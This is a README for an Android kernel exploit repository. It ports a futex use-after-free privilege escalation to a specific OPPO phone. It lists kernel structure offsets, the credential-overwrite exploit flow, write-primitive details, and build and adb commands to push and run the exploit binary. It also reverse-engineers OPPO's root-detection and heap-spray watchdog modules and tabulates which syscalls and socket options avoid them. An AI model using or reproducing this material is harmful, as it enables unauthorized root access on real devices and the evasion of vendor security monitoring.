# GhostLock — OPPO Find X5 Pro (PFEM10)

**English** · [中文](README.zh-CN.md)

[![build](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml/badge.svg)](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml)

GhostLock (CVE-2026-43499) port for the OPPO Find X5 Pro on ColorOS 16. Reaches a `uid=0` child process and a loaded `kernelsu.ko`; the root process is intercepted.

## Vulnerability

**CVE-2026-43499** — futex PI use-after-free. `remove_waiter()` clears `current->pi_blocked_on` when `current` is the requeuer, on the `-EDEADLK` rollback path of `rt_mutex_start_proxy_lock()`.

`remove_waiter` @ `0xffffffc0081ed254` — pre-fix shape.

## Device

| | |
|---|---|
| Device | OPPO Find X5 Pro (PFEM10) |
| SoC | SM8450 / Adreno 730 |
| OS | ColorOS 16.0.3.520 (CN01) |
| Kernel | `5.10.236-android12-9-o-gaf2075ad2c06` |
| Bootloader | locked, green |
| VA_BITS | 39 — `KIMAGE_TEXT_BASE = 0xffffffc008000000` |

## Status

| Stage | |
|---|---|
| Compact waiter trigger (`CMP_REQUEUE_PI` → `EDEADLK`) | works |
| `task_struct` leak (perf) | works |
| PI write (8-byte; value = `0` or a valid kernel address) | works |
| `task+0x778` / `task+0x780` → `Uid=root` | works |
| `kernelsu.ko` loaded | works |
| Root process survives | ⚠ **not established** — see below |
| Path A (UMH / `modprobe_path`) | `STATIC_USERMODEHELPER_PATH=""` |

On "root process survives": the runs in [`evidence/kill.log`](evidence/kill.log)
reach `uid=0` and load `kernelsu.ko`, and in the run that actually polled for it
the KernelSU manager process **survived 120 s** with `kernelsu` still `Live` in
`/proc/modules`. In a later run the same chain left the Android framework
services unreachable (`Can't find service: package/power/input/phone/wifi`)
while the module was still `Live`. **No `[ROOTCHECK-*]` kernel line and no
`$$sys_call_number@@` payload has ever been captured**, so the cause of the
later run's state is not attributed. See [`evidence/notes.md`](evidence/notes.md)
§2.3, §2.4 and §7.

## Offsets

`task_struct`

| Field | Offset |
|---|---|
| `real_cred` / `cred` | `0x778` / `0x780` |
| cached `syscallno` | `0xdf8` |
| cached `uid` / `euid` / `gid` / `egid` | `0xe00` / `0xe08` / `0xe10` / `0xe18` |

`thread_info`

| Field | Offset |
|---|---|
| `flags` | `0x0` |
| `addr_limit` | `0x8` |
| `ttbr0` | `0x10` |
| `preempt_count` | `0x18` |

`cred`

| Field | Offset | Field | Offset |
|---|---|---|---|
| `uid` | `0x4` | `cap_inheritable` | `0x28` |
| `gid` | `0x8` | `cap_permitted` | `0x30` |
| `suid` | `0xc` | `cap_effective` | `0x38` |
| `sgid` | `0x10` | `cap_bset` | `0x40` |
| `euid` | `0x14` | `cap_ambient` | `0x48` |
| `egid` | `0x18` | | |
| `fsuid` / `fsgid` | `0x1c` / `0x20` | | |

## Exploit Flow

```
LT          perf leak target task_struct → file
W7 stage 1  task+0x778 = cred_page  (real_cred → private sprayed cred)
W7 stage 2  task+0x780 = cred_page  (cred)
W7 stage 3  cred_page+8 = 0         (LOCAL repair, second process, ZERO shape)
LT child    fexecve(memfd of loader) — no execve of a /data path
loader      ksud late-load                  → kernelsu ... Live
```

The cred page is built by `payload.c`: all eight id fields zero, all five
capability sets full, and `user` / `user_ns` / `group_info` pointed at
`root_user` / `init_user_ns` / `init_groups`. It is **never** the global
`init_cred` — see "The write primitive, and its side effect" below for why that
matters, and note that stage 3 exists because the write's side effect always
clobbers `cred+8` (`gid`/`suid`) of whatever cred it installs.

perf leak: `PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`, `PERF_SAMPLE_REGS_INTR`, `exclude_user=1`.
Accept `[0xffffff8400000000, 0xffffff90000000)`, votes ≥ 15%.

## The write primitive, and its side effect

The UAF is driven through `rb_erase_cached` Case 1-left. That gives **two**
stores, not one:

```
*(write_target)          = write_value      // the store you aim
*(write_value + 0x08)    = write_target     // unavoidable side effect
```

`write_value` must be 8-byte aligned with bit 0 clear — it is either `0` or a
valid kernel address. **This is why `g_boot_state` cannot be set with this
primitive**: the byte you need to become `1` has its low bit forced to `0` by
the alignment requirement, and `write_value` is the same quantity as the
address the side effect lands at.

### The side effect writes into whatever `write_value` points at

`write_value` is both *the value stored* and *the address the side effect
writes to* (at `+8`). Point it at a global kernel object and you corrupt that
object.

**W7 used to do exactly this** — aiming `write_value` at the `init_cred` alias —
and it is visible in the readback. From `out/t5_w7_778.txt`:

```
shape shift=0 wps=5: in[0]=0xffffff802a7e0be0 (write_value) in[2]=0xffffff8800cdd178 (write_target)
W7[W7] write_target= 0xffffff8800cdd178
Uid:	0	0	4294967176	0
```

`write_value` was the `init_cred` alias and `write_target` was `child_task+0x778`.
`init_cred+8` is `gid`/`suid`, so the side effect stored `0xffffff8800cdd178`
there: `init_cred.gid = 0x00cdd178` and **`init_cred.suid = 0xffffff88 =
4294967176`** — precisely the third field of the `Uid:` line above. Zeroing
`init_cred+8` repaired it (`out/t5_repair.txt`: `Uid: 0 0 4294967176 0` →
`Uid: 0 0 0 0`), which is all that "W7 stage 3" ever was.

**This path is now refused in code.** `V12_W7_INIT_CRED=1` aborts with an
explanation unless `V12_ALLOW_INIT_CRED=1` is also set, and the W2/W6/LTC paths
no longer fall back to `init_cred` when the private cred page is missing — they
abort instead. The default, and the only sane path, is the sprayed cred page.

The side effect itself cannot be avoided: `write_value` must *be* the cred
pointer, so `cred+8` is always clobbered with the write target. Only its
location is a choice — and the repair is now a **local** zero of
`cred_page+8` (stage 3), not a write into a global object.

> A garbage `groups=` readout is a **separate** symptom, not this one. It was
> seen in a run where `gid` and `egid` read back clean, so it cannot come from
> the `init_cred+8` side effect; it points at the fake cred's own `group_info`
> field. See `evidence/notes.md` §10.6.

## Detection paths

Three independent reporters. None is a fallback for another, and **only path 1
can kill the calling task**.

| # | Hook | Trigger | Action |
|---|---|---|---|
| 1 | `oplus_root_check_post_handler`, sys_exit tracepoint | some id descended, or `addr_limit == KERNEL_DS` | `oplus_root_killed` → `printk` + `do_exit(SIGKILL)`; and `oplus_root_check_succ` → `kevent_send_to_user` |
| 2 | `oplus_exe_block_ret_handler`, sys_exit but only for `execve` (221) | `d_path(mm->exe_file)` starts with `/data`, `/data/local/tmp`, `/data/nativetest`, `/data/nativetest64` | `oplus_RWO_root_check` → `printk` + `kevent_send_to_user` (no `do_exit`) |
| 3 | `oplus_secure_harden` kretprobes | `setsockopt` optname ∈ {41,42,48}, `setxattr`, `/proc/cpuinfo`, SELinux policy reload | `oplus_heapspray_check` → `kevent_send_to_user` |

**Path 2 fires on `execve`, not on credential change, and it is a separate code
path from path 1.** It reports through `kevent_send_to_user`, so what happens
next is a userspace daemon's decision, not the kernel's.

The check is on the path of the image **being exec'd**, so it is not enough to
memfd-load the loader's *payload*: if the loader itself is exec'd from
`/data/local/tmp`, that first `execve` already reports. `d_path()` on a memfd is
`/memfd:…`, so **the loader must itself be exec'd through a memfd** —
`V12_EXEC_MEMFD` is now on by default for exactly this reason. The old behaviour
is visible in RUN 4:

```
LT child exec /data/local/tmp/glx12 (4 args)     <- execve of a /data path while uid=0
LT child memfd loaded 5014624 bytes (fd=5)       <- memfd only protected the second image
```

Greppable markers for path 2:

```
[ROOTCHECK-EXEC-INFO]:common %s result %s      with  "execve_report" / "execve_block"
%d,path@@%s                                    kevent payload fragment
```

Because path 2 and path 3 report only through kevent, **"no `[ROOTCHECK-*]` in
the kernel log" does not exclude either of them having fired.** That inference
needs the userspace receiver, which we have not located.

## Watchdog — `oplus_security_guard.ko`

`sys_enter` cache:

```asm
ldrsw x8, [x1, #0x118]          ; regs->syscallno
mrs   x9, sp_el0                ; current
ldr   x10, [x9, #0x780]         ; cred
str   x8,  [x9, #0xdf8]
ldr   w8,  [x10, #4]    → str x8, [x9, #0xe00]   ; uid
ldr   w8,  [x10, #0x14] → str x8, [x9, #0xe08]   ; euid
ldr   w8,  [x10, #8]    → str x8, [x9, #0xe10]   ; gid
ldr   w8,  [x10, #0x18] → str x8, [x9, #0xe18]   ; egid
```

`sys_exit` check:

```asm
ldr   x0,  [x8, #0xe00]         ; cached uid
cbz   x0, #0x48c                ; cached uid == 0 → return
adrp  x9, #0 ; ldrb w9, [x9]    ; g_boot_state
tbnz  w9, #0, #0x48c            ; is_unlocked → return
ldr   x9,  [x8, #0x780]         ; cred
ldr   w3,  [x8, #0xdf8]         ; cached syscallno
cmp   x0, w10 ; b.hi #0x468     ; uid descending → kill path
                                ; euid / gid / egid, same shape
ldr   x9,  [x8, #8]             ; addr_limit
cmp   x9,  #0x8000000001
b.lo  #0x48c                    ; addr_limit != KERNEL_DS → return
sub   w9,  w3, #0x8f            ; syscallno - 143
cmp   w9,  #0x47
b.hi  #0x4a0                    ; outside 143..214 → kill
ldrsw x12, [x10, x9, lsl #2]    ; jmp table @ .rodata+0
br    x11
0x48c: ret
0x4a0: bl oplus_root_check_succ ; printk + kevent_send_to_user
       bl oplus_root_killed     ; printk + do_exit(SIGKILL)
```

**Control-flow note (matters for exploit ordering).** The four descending-edge
comparisons branch **straight to `0x468`**, the syscall-number dispatch — they do
**not** fall through the `addr_limit` gate. `0x454`–`0x464` is only reached when
**no** id descended. So the dispatch is entered when *either* some id descended
*or* `addr_limit == KERNEL_DS`; it is **not** gated by `addr_limit`.

Consequences:

* The killer fires on the syscall **during which** the credentials changed — the
  one whose `sys_enter` still cached the old uid. If the task is already `uid=0`
  when a syscall enters (`0x400` `cbz`), the hook returns and stays blind from
  then on.
* Therefore a credential change is survivable **without** touching the module:
  let *another* task perform the write while the victim spins in user space, or
  route the change through one of the 12 exempt syscalls. See
  `delivery/外部建议评审_2026-09-18.md`.

`g_boot_state` — 1 byte `.data..ro_after_init`, set at module init from `verified_bootstate` via `strstr`. `is_unlocked()` = `LDRB` + `RET`.

Module VA writes fault (`CONFIG_STRICT_MODULE_RWX=y`) — use the physmap alias `0xffffff80…`.

Report payload: `$$sys_call_number@@%d`, `$$set_id_flag@@%d`, `$$addr_limit@@%lx`, `$$enforce@@%d`.

### Exempt syscalls — `.rodata+0`, indices 143–214

| 143 `setregid` | 144 `setgid` | 145 `setreuid` | 146 `setuid` |
|---|---|---|---|
| 147 `setresuid` | 149 `setresgid` | 203 `connect` | 204 `getsockname` |
| 208 `setsockopt` | 210 `shutdown` | 213 `readahead` | 214 `brk` |

Remaining 60 entries → report + kill.

**Do not block a thread on `sendmsg` (211) while its credentials change.** It is
not in the table, so the thread is reported and killed. The only syscalls that
are safe to be blocked in for that purpose are the twelve above:
`setregid`, `setgid`, `setreuid`, `setuid`, `setresuid`, `setresgid`,
`connect`, `getsockname`, `setsockopt`, `shutdown`, `readahead`, `brk`.

> **Correction (2026-09-18).** An earlier revision of this table labelled every
> entry **one lower** than the real arm64 syscall number (`146` was called
> `setresuid`; it is `setuid` — `setresuid` is `147`). The numbers were always
> right; only the names were wrong. Names are now resolved from
> `sys_call_table` @ `0xffffffc00a13d8c0` in this device's kernel image. In
> particular `sendmsg` (211), `munmap` (215), `getsockopt` (209) and
> `getpeername` (205) are **not** exempt — blocking a thread in any of those
> while its credentials change is a kill, not a pass. Regenerate with
> `tools/gen_exempt_table.py`.

## Heap-Spray Detector — `oplus_secure_harden.ko`

| kretprobe | Hooks | Filter |
|---|---|---|
| `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
| `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
| `cpuinfo_kretprobe` | `cpuinfo_open` | — |
| `setxattr_kretprobe` | `setxattr` | — |
| `sepolicy_reload_kretprobe` | `spolicy_reload` | — |

```asm
ldr  w8, [x1, #8]       ; regs[1]
cmp  w8, #0x29          ; 41 IP_MSFILTER
b.eq #0xd58
cmp  w8, #0x30          ; 48 MCAST_MSFILTER
b.eq #0xd60
cmp  w8, #0x2a          ; 42 MCAST_JOIN_GROUP
b.ne #0xd68             ; else → return, no call
bl   oplus_heapspray_check
```

`entry_handler_setxattr` → `oplus_heapspray_check(7)`, `entry_handler_cpuinfo` → `(6)`, both unconditional.

`oplus_heapspray_check` — counters `heapspary_ip4` / `ip6` / `xttr` / `cpuinfo`, `ktime_get_real_ts64` delta, 7 report sites (`snprintf` + `printk` + `kevent_send_to_user`), gated on `verified_bootstate`.

### Avoidance

| Primitive | |
|---|---|
| `setsockopt` optname 46 `MCAST_JOIN_SOURCE_GROUP` | not filtered |
| `setsockopt` level `SOL_IPV6` (41) | not filtered if filter reads `level` |
| `setxattr` | always counted |
| `/proc/cpuinfo` | always counted |
| `socket()` / `socketpair()` | not hooked |
| `sendmsg`, `pipe`, `memfd`, `add_key`, `io_uring`, mmap | not hooked |

## Config

```
CONFIG_CFI_CLANG=y
CONFIG_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_SET_FS=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MODULE_REGION_FULL=n
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_ARM64_SW_TTBR0_PAN=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y
CONFIG_RANDOM_KMALLOC_CACHES=n
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
CONFIG_ANDROID_BINDER_IPC=y
CONFIG_KASAN=y
```

`perf_event_paranoid = -1`

## Build

NDK **r28c**. `-O1` / API **26** / `-D__ARM=1` are **fixed** — they keep the reclaim stack-frame geometry (`delta=0` calibration). Changing any of them requires re-calibrating on device.

```bash
export ANDROID_NDK_HOME=/path/to/android-ndk-r28c
make                      # → exploit_guard
./build.sh                # same, with NDK auto-detection
```

Manual:

```bash
"$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android26-clang" \
  -D__ARM=1 -O1 -Wall -Wextra -pthread -Isrc/core -Isrc/devices/pfem10 \
  -o exploit_guard src/core/exploit.c
```

CI builds on every push (`.github/workflows/build.yml`, Ubuntu + NDK r28c, artifact `exploit_guard`).

## Setup

```bash
adb push exploit_guard /data/local/tmp/e
adb shell chmod 755 /data/local/tmp/e
adb shell /data/local/tmp/e
```

## Files

```
src/core/                 exploit.c  payload.c  payload.h  fdset_map.h
src/lib/                  KernelSnitch — kernelsnitch.h  futex_hash.h  timeutils.h  utils.h
src/devices/pfem10/       pfem10_target.h
model/                    model.c — host-side rtmutex chain-walk model
tools/                    kdis.py  kdis_ko.py  kdis_ko_reloc.py  gen_guard_disasm.py
                          gen_exempt_table.py  mod_layout.py  sct_dump.py
                          find_task_off.py  slide_resolve.py
artifacts/                guard_post_handler.s   kill chain, relocations resolved
                          guard_relocs.txt       raw .text relocation dump
                          guard_disasm.txt       guard + heap-spray detector
                          guard_exempt_table.txt 72-slot jump table, real names
evidence/                 kill.log  notes.md — device captures and their limits
Makefile  build.sh        exploit build (-O1, API 26, NDK r28c)
run.sh                    device-side run orchestration (retry across reboots)
.github/workflows/        build.yml — cloud build + artifact
```

## Evidence

[`evidence/kill.log`](evidence/kill.log) — verbatim `adb shell` transcripts of four
root runs: the full timeline, the moment the target task's uid becomes 0, the
`kernelsu.ko` load, and the state afterwards. Read the header block first: it
lists what the file does **not** contain and why.

[`evidence/notes.md`](evidence/notes.md) — the kernel side. Module addresses and
which `/proc` channels work in which SELinux state; the full `g_boot_state`
derivation including the `strstr` key; the corrected exempt table; the capture
recipe that would produce the missing kernel half; and a list of what is still
open.

[`evidence/2026-09-18-bootA/`](evidence/2026-09-18-bootA/README.md) — the first
device run of the current design. Both attempts ended in an **orderly reboot**
(`bootreason=reboot`, no panic) and **neither reached the credential write**, so
the question it was meant to answer is still open. It also documents the
methodology error worth knowing about: **`dmesg -w` is a no-op on this device**
(toybox dumps once and exits), so that run's kernel log held only pre-capture
history — "no `[ROOTCHECK-*]`" was not evidence of anything. `evidence/notes.md`
§6 now carries the corrected poll-and-stream-to-host recipe.

[`run_bootA.sh`](run_bootA.sh) — orchestration for that one boot, in the order
that matters (`0x778` → `0x780` → local repair of the cred that was actually
installed → confirm → only then poke). `ADB=`/`SER=`/`BIN_LOCAL=` overridable.

[`artifacts/guard_post_handler.s`](artifacts/guard_post_handler.s) — the kill
chain with relocations filled in. `adrp x9, #0` in the older listings is
`.data..ro_after_init`; `bl #0x4ac` is `oplus_root_check_succ`. Regenerate with
`tools/gen_guard_disasm.py` after pulling the vendor modules from your own device.

`tools/kdis_ko.py` — RELA matched by `sh_info`; on these builds `.text` relocs live in `.rela.text.<func>`, so name-based lookup returns nothing.

## Related

| Project | |
|---|---|
| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | reference implementation; 5.10 compact waiter |
| [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | original GhostLock research |

## License

GPL-3.0 — see [LICENSE](LICENSE).
